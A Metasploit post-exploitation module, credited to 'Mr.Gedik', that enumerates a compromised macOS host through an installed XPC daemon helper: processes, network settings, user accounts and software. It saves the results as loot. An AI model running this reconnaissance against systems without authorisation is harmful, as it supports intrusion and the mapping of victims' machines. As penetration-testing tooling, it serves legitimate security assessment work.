##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC System Enumeration',
        'Description'  => %q{
          Performs full system enumeration on a macOS target via the XPC daemon.
          Collects hardware info, OS version, running processes, network config,
          user accounts, and installed software. Results are displayed as a table
          and stored as loot.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Running full system enumeration via XPC daemon...")
    data = xpc_exec!('e1')
    return if data.nil?

    if data.is_a?(Hash)
      xpc_print_table('System Enumeration', data)
    elsif data.is_a?(Array)
      data.each do |section|
        next unless section.is_a?(Hash)
        title = section.delete('_section') || 'Info'
        xpc_print_table(title, section)
      end
    end

    loot_path = xpc_store_loot(
      'system_enum',
      data.to_json,
      'system_enum.json',
      'macOS system enumeration via XPC'
    )
    print_good("System enumeration saved to #{loot_path}")
  end
end
